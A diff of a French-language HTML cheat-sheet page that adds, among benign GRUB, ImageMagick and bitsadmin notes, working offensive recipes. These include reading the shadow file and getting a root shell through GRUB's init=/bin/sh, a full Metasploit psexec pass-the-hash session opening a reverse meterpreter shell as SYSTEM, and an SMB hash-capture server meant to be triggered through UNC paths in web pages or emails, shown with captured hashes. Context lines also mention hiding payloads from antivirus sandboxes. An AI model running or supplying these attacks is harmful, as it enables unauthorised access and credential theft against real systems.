@@ -5,7 +5,7 @@
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <meta name="generator" content="pandoc" />
   <meta name="author" content="Poulpy, Plopi42" />
-  <meta name="date" content="2013-04-25" />
+  <meta name="date" content="2014-01-08" />
   <title>Technical cheat sheets</title>
   <style type="text/css">
 table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
@@ -33,7 +33,7 @@ code > span.er { font-weight: bold; }
 <div id="header">
 <h1 class="title">Technical cheat sheets</h1>
 <h2 class="author">Poulpy, Plopi42</h2>
-<h3 class="date">2013-04-25</h3>
+<h3 class="date">2014-01-08</h3>
 </div>
 <div id="TOC">
 <ul>
@@ -54,15 +54,13 @@ code > span.er { font-weight: bold; }
 </ul></li>
 </ul></li>
 <li><a href="#devlopment">Devlopment</a><ul>
+<li><a href="#web">Web</a><ul>
+<li><a href="#captchagenerator">captchaGenerator</a></li>
+</ul></li>
 <li><a href="#windows">Windows</a><ul>
 <li><a href="#socket-windows-en-c-c">Socket Windows en C / C++</a><ul>
 <li><a href="#client">Client</a></li>
 <li><a href="#serveur">Serveur</a></li>
-</ul></li>
-<li><a href="#windows-sockets.txt">.#windows-sockets.txt</a></li>
-<li><a href="#socket-windows-en-c-c-1">Socket Windows en C / C++</a><ul>
-<li><a href="#client-1">Client</a></li>
-<li><a href="#serveur-1">Serveur</a></li>
 </ul></li>
 </ul></li>
 </ul></li>
@@ -101,6 +99,17 @@ code > span.er { font-weight: bold; }
 <li><a href="#delete-a-remote-branch">Delete a Remote Branch</a></li>
 </ul></li>
 </ul></li>
+<li><a href="#grub-configuration">GRUB (configuration)</a><ul>
+<li><a href="#modification-de-la-taille-du-terminal">Modification de la taille du terminal</a></li>
+</ul></li>
+<li><a href="#grub-exploitation">GRUB (exploitation)</a><ul>
+<li><a href="#affichage-du-fichier-shadow">Affichage du fichier shadow</a></li>
+<li><a href="#récupération-dun-shell-root">Récupération d’un shell root</a></li>
+</ul></li>
+<li><a href="#image-magick">Image Magick</a><ul>
+<li><a href="#créer-une-image">Créer une image</a></li>
+<li><a href="#write-text-on-an-image">Write text on an image</a></li>
+</ul></li>
 <li><a href="#john-the-ripper">John the ripper</a><ul>
 <li><a href="#hash-lm-vers-hash-ntlm">Hash LM vers Hash NTLM</a></li>
 </ul></li>
@@ -117,6 +126,10 @@ code > span.er { font-weight: bold; }
 <li><a href="#lancement-de-handler">Lancement de handler</a></li>
 <li><a href="#exploitation-depuis-msfconsole">Exploitation depuis msfconsole</a></li>
 <li><a href="#contournement-des-antivirus">Contournement des antivirus</a></li>
+<li><a href="#passthehash-en-utilisant-metasploit">PassTheHash en utilisant metasploit</a></li>
+<li><a href="#récupération-de-mots-de-passe">Récupération de mots de passe</a><ul>
+<li><a href="#exploitation-de-mauvaise-configuration-de-client-samba">Exploitation de mauvaise configuration de client samba</a></li>
+</ul></li>
 </ul></li>
 <li><a href="#vlc">VLC</a><ul>
 <li><a href="#transcoding">Transcoding</a><ul>
@@ -148,6 +161,7 @@ code > span.er { font-weight: bold; }
 <li><a href="#gestion-des-services">Gestion des services</a></li>
 <li><a href="#gestion-des-fichiers">Gestion des fichiers</a></li>
 <li><a href="#commandes-utiles">Commandes utiles</a></li>
+<li><a href="#téléchargement-dun-fichier">Téléchargement d’un fichier</a></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -186,6 +200,8 @@ QUJD</code></pre>
 <pre><code>$ echo -n &#39;ABCA&#39; | base64
 QUJDQQ==</code></pre>
 <h1 id="devlopment"><a href="#TOC">Devlopment</a></h1>
+<h2 id="web"><a href="#TOC">Web</a></h2>
+<h3 id="captchagenerator"><a href="#TOC">captchaGenerator</a></h3>
 <h2 id="windows"><a href="#TOC">Windows</a></h2>
 <h3 id="socket-windows-en-c-c"><a href="#TOC">Socket Windows en C / C++</a></h3>
 <h4 id="client"><a href="#TOC">Client</a></h4>
@@ -315,274 +331,6 @@ QUJDQQ==</code></pre>
     <span class="kw">return</span> <span class="dv">0</span>;
 }</code></pre>
 <h4 id="serveur"><a href="#TOC">Serveur</a></h4>
-<pre class="sourceCode C"><code class="sourceCode c">
-<span class="ot">#define WIN32_LEAN_AND_MEAN</span>
-
-<span class="ot">#undef UNICODE</span>
-
-
-<span class="ot">#include &lt;windows.h&gt;</span>
-<span class="ot">#include &lt;winsock2.h&gt;</span>
-<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
-<span class="ot">#include &lt;stdlib.h&gt;</span>
-<span class="ot">#include &lt;stdio.h&gt;</span>
-
-<span class="co">// Need to link with Ws2_32.lib</span>
-<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
-<span class="co">// #pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
-
-<span class="ot">#define DEFAULT_BUFLEN 512</span>
-<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
-
-<span class="dt">int</span> __cdecl main(<span class="dt">void</span>) 
-{
-    WSADATA wsaData;
-    <span class="dt">int</span> iResult;
-
-    SOCKET ListenSocket = INVALID_SOCKET;
-    SOCKET ClientSocket = INVALID_SOCKET;
-
-    <span class="kw">struct</span> addrinfo *result = NULL;
-    <span class="kw">struct</span> addrinfo hints;
-
-    <span class="dt">int</span> iSendResult;
-    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
-    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
-
-    <span class="co">// Initialize Winsock</span>
-    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
-    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
-        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    ZeroMemory(&amp;hints, <span class="kw">sizeof</span>(hints));
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-    hints.ai_flags = AI_PASSIVE;
-
-    <span class="co">// Resolve the server address and port</span>
-    iResult = getaddrinfo(NULL, DEFAULT_PORT, &amp;hints, &amp;result);
-    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
-        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Create a SOCKET for connecting to server</span>
-    ListenSocket = socket(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
-    <span class="kw">if</span> (ListenSocket == INVALID_SOCKET) {
-        printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        freeaddrinfo(result);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Setup the TCP listening socket</span>
-    iResult = bind( ListenSocket, result-&gt;ai_addr, (<span class="dt">int</span>)result-&gt;ai_addrlen);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;bind failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        freeaddrinfo(result);
-        closesocket(ListenSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    freeaddrinfo(result);
-
-    iResult = listen(ListenSocket, SOMAXCONN);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;listen failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ListenSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Accept a client socket</span>
-    ClientSocket = accept(ListenSocket, NULL, NULL);
-    <span class="kw">if</span> (ClientSocket == INVALID_SOCKET) {
-        printf(<span class="st">&quot;accept failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ListenSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// No longer need server socket</span>
-    closesocket(ListenSocket);
-
-    <span class="co">// Receive until the peer shuts down the connection</span>
-    <span class="kw">do</span> {
-
-        iResult = recv(ClientSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
-        <span class="kw">if</span> (iResult &gt; <span class="dv">0</span>) {
-            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-
-        <span class="co">// Echo the buffer back to the sender</span>
-            iSendResult = send( ClientSocket, recvbuf, iResult, <span class="dv">0</span> );
-            <span class="kw">if</span> (iSendResult == SOCKET_ERROR) {
-                printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-                closesocket(ClientSocket);
-                WSACleanup();
-                <span class="kw">return</span> <span class="dv">1</span>;
-            }
-            printf(<span class="st">&quot;Bytes sent: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iSendResult);
-        }
-        <span class="kw">else</span> <span class="kw">if</span> (iResult == <span class="dv">0</span>)
-            printf(<span class="st">&quot;Connection closing...</span><span class="ch">\n</span><span class="st">&quot;</span>);
-        <span class="kw">else</span>  {
-            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-            closesocket(ClientSocket);
-            WSACleanup();
-            <span class="kw">return</span> <span class="dv">1</span>;
-        }
-
-    } <span class="kw">while</span> (iResult &gt; <span class="dv">0</span>);
-
-    <span class="co">// shutdown the connection since we&#39;re done</span>
-    iResult = shutdown(ClientSocket, SD_SEND);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ClientSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// cleanup</span>
-    closesocket(ClientSocket);
-    WSACleanup();
-
-    <span class="kw">return</span> <span class="dv">0</span>;
-}</code></pre>
-<h3 id="windows-sockets.txt"><a href="#TOC">.#windows-sockets.txt</a></h3>
-<h3 id="socket-windows-en-c-c-1"><a href="#TOC">Socket Windows en C / C++</a></h3>
-<h4 id="client-1"><a href="#TOC">Client</a></h4>
-<pre class="sourceCode C"><code class="sourceCode c"><span class="ot">#define WIN32_LEAN_AND_MEAN</span>
-
-<span class="ot">#include &lt;windows.h&gt;</span>
-<span class="ot">#include &lt;winsock2.h&gt;</span>
-<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
-<span class="ot">#include &lt;stdlib.h&gt;</span>
-<span class="ot">#include &lt;stdio.h&gt;</span>
-
-
-<span class="co">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span>
-<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
-<span class="ot">#pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
-<span class="ot">#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span>
-
-
-<span class="ot">#define DEFAULT_BUFLEN 512</span>
-<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
-
-<span class="dt">int</span> __cdecl main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv) 
-{
-    WSADATA wsaData;
-    SOCKET ConnectSocket = INVALID_SOCKET;
-    <span class="kw">struct</span> addrinfo *result = NULL,
-                    *ptr = NULL,
-                    hints;
-    <span class="dt">char</span> *sendbuf = <span class="st">&quot;this is a test&quot;</span>;
-    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
-    <span class="dt">int</span> iResult;
-    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
-
-    <span class="co">// Validate the parameters</span>
-    <span class="kw">if</span> (argc != <span class="dv">2</span>) {
-        printf(<span class="st">&quot;usage: %s server-name</span><span class="ch">\n</span><span class="st">&quot;</span>, argv[<span class="dv">0</span>]);
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Initialize Winsock</span>
-    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
-    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
-        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    ZeroMemory( &amp;hints, <span class="kw">sizeof</span>(hints) );
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-
-    <span class="co">// Resolve the server address and port</span>
-    iResult = getaddrinfo(argv[<span class="dv">1</span>], DEFAULT_PORT, &amp;hints, &amp;result);
-    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
-        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Attempt to connect to an address until one succeeds</span>
-    <span class="kw">for</span>(ptr=result; ptr != NULL ;ptr=ptr-&gt;ai_next) {
-
-        <span class="co">// Create a SOCKET for connecting to server</span>
-        ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, 
-            ptr-&gt;ai_protocol);
-        <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
-            printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-            WSACleanup();
-            <span class="kw">return</span> <span class="dv">1</span>;
-        }
-
-        <span class="co">// Connect to server.</span>
-        iResult = connect( ConnectSocket, ptr-&gt;ai_addr, (<span class="dt">int</span>)ptr-&gt;ai_addrlen);
-        <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-            closesocket(ConnectSocket);
-            ConnectSocket = INVALID_SOCKET;
-            <span class="kw">continue</span>;
-        }
-        <span class="kw">break</span>;
-    }
-
-    freeaddrinfo(result);
-
-    <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
-        printf(<span class="st">&quot;Unable to connect to server!</span><span class="ch">\n</span><span class="st">&quot;</span>);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Send an initial buffer</span>
-    iResult = send( ConnectSocket, sendbuf, (<span class="dt">int</span>)strlen(sendbuf), <span class="dv">0</span> );
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    printf(<span class="st">&quot;Bytes Sent: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-
-    <span class="co">// shutdown the connection since no more data will be sent</span>
-    iResult = shutdown(ConnectSocket, SD_SEND);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Receive until the peer closes the connection</span>
-    <span class="kw">do</span> {
-
-        iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
-        <span class="kw">if</span> ( iResult &gt; <span class="dv">0</span> )
-            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        <span class="kw">else</span> <span class="kw">if</span> ( iResult == <span class="dv">0</span> )
-            printf(<span class="st">&quot;Connection closed</span><span class="ch">\n</span><span class="st">&quot;</span>);
-        <span class="kw">else</span>
-            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-
-    } <span class="kw">while</span>( iResult &gt; <span class="dv">0</span> );
-
-    <span class="co">// cleanup</span>
-    closesocket(ConnectSocket);
-    WSACleanup();
-
-    <span class="kw">return</span> <span class="dv">0</span>;
-}</code></pre>
-<h4 id="serveur-1"><a href="#TOC">Serveur</a></h4>
 <pre class="sourceCode C"><code class="sourceCode c">
 <span class="ot">#define WIN32_LEAN_AND_MEAN</span>
 
@@ -923,6 +671,54 @@ git merge experimental       # merge experimental dans crazy_idea
                                      #  toujours effacer cette branche avec -D</code></pre>
 <h4 id="delete-a-remote-branch"><a href="#TOC">Delete a Remote Branch</a></h4>
 <pre><code>git push origin :testing                      #will delete the branch staging from the origin repository.</code></pre>
+<h2 id="grub-configuration"><a href="#TOC">GRUB (configuration)</a></h2>
+<h3 id="modification-de-la-taille-du-terminal"><a href="#TOC">Modification de la taille du terminal</a></h3>
+<p>Pour Grub2, il suffit de : * Surcharger la valeur de GRUB_GFXMODE dans /etc/default/grub ; * Surcharger la valeur de GRUB_GFXPAYLOAD_LINUX dans /etc/default/grub ; * Mettre à jour grub ; * Redémarrer.</p>
+<p>Soit, en root :</p>
+<pre><code>echo GRUB_GFXMODE=1024x768      &gt;&gt; /etc/default/grub
+echo GRUB_GFXPAYLOAD_LINUX=keep &gt;&gt; /etc/default/grub
+update-grub
+reboot</code></pre>
+<h2 id="grub-exploitation"><a href="#TOC">GRUB (exploitation)</a></h2>
+<h3 id="affichage-du-fichier-shadow"><a href="#TOC">Affichage du fichier shadow</a></h3>
+<p>Il faut tout d’abord accéder au shell de GRUB. Pour ce faire, il suffit de presser la touche <strong>c</strong> quand le menu de sélection de grub s’affiche :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-menu.png" title="Grub menu" alt="Menu" /><p class="caption">Menu</p>
+</div>
+<p>Ensuite, il faut trouver le fichier shadow. Pour cela, il est possible d’utiliser la commande <strong>ls</strong> pour lister les devices disponibles :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-ls.png" title="Grub command line : ls" alt="Ls" /><p class="caption">Ls</p>
+</div>
+<p>Pour faire plus simple, il est possible d’utiliser la commande <strong>search</strong> :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-search.png" title="Grub command line : search" alt="Search" /><p class="caption">Search</p>
+</div>
+<p>Une fois le fichier trouvé, il ne reste plus qu’à afficher le fichier avec la commande <strong>cat</strong> :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-cat1.png" title="Grub command line : cat" /><p class="caption"></p>
+</div>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-cat2.png" title="Grub command line : cat" /><p class="caption"></p>
+</div>
+<h3 id="récupération-dun-shell-root"><a href="#TOC">Récupération d’un shell root</a></h3>
+<p>Il faut tout d’abord accéder à la modification du boot. Pour ce faire, il suffit de <strong>sélectionner le système cible</strong>, puis de presser la touche <strong>e</strong> :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-edit.png" title="Grub boot edit" alt="Mode édition" /><p class="caption">Mode édition</p>
+</div>
+<p>Il faut rajouter le paramètre suivant à la ligne de chargement du kernel, celle-ci commence par <strong>linux</strong> :</p>
+<pre><code>init=/bin/sh</code></pre>
+<p>En pressant Ctrl-X, le système démarre et nous présente un shell root :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-modified-init.png" title="Linux root shell" alt="Shell root" /><p class="caption">Shell root</p>
+</div>
+<h2 id="image-magick"><a href="#TOC">Image Magick</a></h2>
+<h3 id="créer-une-image"><a href="#TOC">Créer une image</a></h3>
+<p>La ligne de commande suivante créer une image blanche de 100 pixels par 100 pixels :</p>
+<pre><code>convert -size 100x100 xc:white canvas.jp</code></pre>
+<h3 id="write-text-on-an-image"><a href="#TOC">Write text on an image</a></h3>
+<p>La ligne de commande suivante ecrit en taille 26 “My Caption” en jaune sur l’image orig.jpg aux coordonnées (200, 200) et enregistre le résultat dans dest.jpg.</p>
+<pre><code>convert -pointsize 26 -fill yellow -draw &#39;text 200,200 &quot;My Caption&quot; &#39; orig.jpg dest.jpg</code></pre>
+<p>Pour aller plus loin, il est possible d’ajouter l’argument “-font Helvetica” pour sélectionner la police.</p>
 <h2 id="john-the-ripper"><a href="#TOC">John the ripper</a></h2>
 <h3 id="hash-lm-vers-hash-ntlm"><a href="#TOC">Hash LM vers Hash NTLM</a></h3>
 <p>Une fois les hashs LM découvert, il est souvent utiles de casser les hashs NTLM afin d’otenir le mot de passe à la casse prêt.</p>
@@ -976,6 +772,119 @@ exploit</code></pre>
 <p>Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.</p>
 <p>Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d’effectuer une connexion réseau. En utilisant le template <a href="../ressources/Tools/metasploit/meterpreterTemplate1.zip">ci-joint</a> et l’encoder metasploit <a href="../ressources/Tools/metasploit/xorbyte.rb">ci-joint</a> à placer dans modules/encoders/x86/xorbyte.rb.</p>
 <p>Pour une backdoor plus permanente, en bind tcp, il est possible d’utiliser le template <a href="../ressources/Tools/metasploit/meterpreterTemplate2.zip">ci-joint</a>.</p>
+<h3 id="passthehash-en-utilisant-metasploit"><a href="#TOC">PassTheHash en utilisant metasploit</a></h3>
+<p>Le module <em>exploit/windows/smb/psexec</em> permet de réaliser de s’authentifier sur une machine Windows en PassTheHash et d’obtenir un shell meterpreter :</p>
+<pre><code># msfconsole -q
+msf &gt; use exploit/windows/smb/psexec
+msf  exploit(psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+msf  exploit(psexec) &gt; set LHOST 10.42.42.42
+LHOST =&gt; 10.42.42.42
+msf  exploit(psexec) &gt; set SMBPass aad3b435ffffffffffffffffff1404ee:253b4ffffffffffffffffffff6f31185
+SMBPass =&gt; aad3b435bfffffffffffffffffff04ee:253b4a94bcfffffffffffffaf6f31185
+msf  exploit(psexec) &gt; set SMBUser Administrateur
+SMBUser =&gt; Administrateur
+msf  exploit(psexec) &gt; set RHOST 10.42.42.238
+RHOST =&gt; 10.42.42.238
+msf  exploit(psexec) &gt; exploit -z
+
+[*] Started reverse handler on 10.42.42.42:4444
+[*] Connecting to the server...
+[*] Authenticating to 10.42.42.238:445|WORKGROUP as user &#39;Administrateur&#39;...
+[*] Uploading payload...
+[*] Created \wHREjtTN.exe...
+[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.42.42.238[\svcctl] ...
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.42.42.238[\svcctl] ...
+[*] Obtaining a service manager handle...
+[*] Creating a new service (MLkScPls - &quot;MVZHuslgOhCiQVBanShOvcO&quot;)...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \wHREjtTN.exe...
+[*] Sending stage (752128 bytes) to 10.42.42.238
+[*] Meterpreter session 1 opened (10.42.42.42:4444 -&gt; 10.42.42.238:58782) at 2012-04-27 10:42:16 +0200
+[*] Session 1 created in the background.
+msf  exploit(psexec) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Type                   Information                  Connection
+  --  ----                   -----------                  ----------
+  1   meterpreter x86/win32  AUTORITE NT\SYSTEM @ C61112  10.42.42.42:4444 -&gt; 10.42.42.238:58782 (10.42.42.238)
+
+msf  exploit(psexec) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt;</code></pre>
+<h3 id="récupération-de-mots-de-passe"><a href="#TOC">Récupération de mots de passe</a></h3>
+<h4 id="exploitation-de-mauvaise-configuration-de-client-samba"><a href="#TOC">Exploitation de mauvaise configuration de client samba</a></h4>
+<p>Le module <em>auxiliary/server/capture/smb</em> permet de simuler un serveur samba avec un niveau de sécurité faible afin de capturer les hashs des utilisateurs :</p>
+<pre><code># msfconsole -q
+msf  &gt; use auxiliary/server/capture/smb
+msf  auxiliary(smb) &gt; set CAINPWFILE /tmp/smb_cain.txt
+CAINPWFILE =&gt; /tmp/smb_cain.txt
+msf  auxiliary(smb) &gt; set JOHNPWFILE /tmp/smb_john.txt
+JOHNPWFILE =&gt; /tmp/smb_john.txt
+msf  auxiliary(smb) &gt; info
+
+       Name: Authentication Capture: SMB
+     Module: auxiliary/server/capture/smb
+    Version: 14976
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  hdm &lt;hdm@metasploit.com&gt;
+
+Basic options:
+  Name        Current Setting    Required  Description
+  ----        ---------------    --------  -----------
+  CAINPWFILE  /tmp/smb_cain.txt  no        The local filename to store the hashes in Cain&amp;Abel format
+  CHALLENGE   1122334455667788   yes       The 8 byte challenge
+  JOHNPWFILE  /tmp/smb_john.txt  no        The prefix to the local filename to store the hashes in JOHN format
+  SRVHOST     0.0.0.0            yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT     445                yes       The local port to listen on.
+  SSL         false              no        Negotiate SSL for incoming connections
+  SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
+  SSLVersion  SSL3               no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+
+Description:
+  This module provides a SMB service that can be used to capture the
+  challenge-response password hashes of SMB client systems. Responses
+  sent by this service have by default the configurable challenge
+  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
+  cracking using Cain &amp; Abel, L0phtcrack or John the ripper (with
+  jumbo patch). To exploit this, the target system must try to
+  authenticate to this module. The easiest way to force a SMB
+  authentication attempt is by embedding a UNC path (\\SERVER\SHARE)
+  into a web page or email message. When the victim views the web page
+  or email, their system will automatically connect to the server
+  specified in the UNC share (the IP address of the system running
+  this module) and attempt to authenticate.
+
+msf  auxiliary(smb) &gt; run
+[*] Auxiliary module execution completed
+
+[*] Server started.
+msf  auxiliary(smb) &gt; [*] Empty hash captured from 10.67.4.224:1854 captured, ignoring ...
+[*] 2012-05-03 17:56:45 +0200
+NTLMv1 Response Captured from 10.67.4.224:1854
+USER:My DOMAIN:FR OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
+LMHASH:7a0ffffffffffffffffffffffffffffffffffffffffbc673
+NTHASH:d4acfffffffffffffffffffffffffffffffffffffff88736
+
+[*] Empty hash captured from 10.42.42.24:1864 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1871 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1873 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1880 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1887 captured, ignoring ...
+
+msf  auxiliary(smb) &gt;
+
+testuser::FR:175c0e51065adfffffffffffffffffffffffffff78d268aa:175c0e51065adffffffffffffffffffffffff44078d268aa:1122334455667788</code></pre>
 <h2 id="vlc"><a href="#TOC">VLC</a></h2>
 <h3 id="transcoding"><a href="#TOC">Transcoding</a></h3>
 <h4 id="vers-mp4"><a href="#TOC">vers MP4</a></h4>
@@ -1080,6 +989,8 @@ sc delete Powned</code></pre>
 </tr>
 </tbody>
 </table>
+<h3 id="téléchargement-dun-fichier"><a href="#TOC">Téléchargement d’un fichier</a></h3>
+<pre><code>bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip</code></pre>
 <div id="footer">
   &copy; 2012 <a href="http://https://github.com/phil2600/tech-scribe/">Tech-Scribe</a>
 </div>
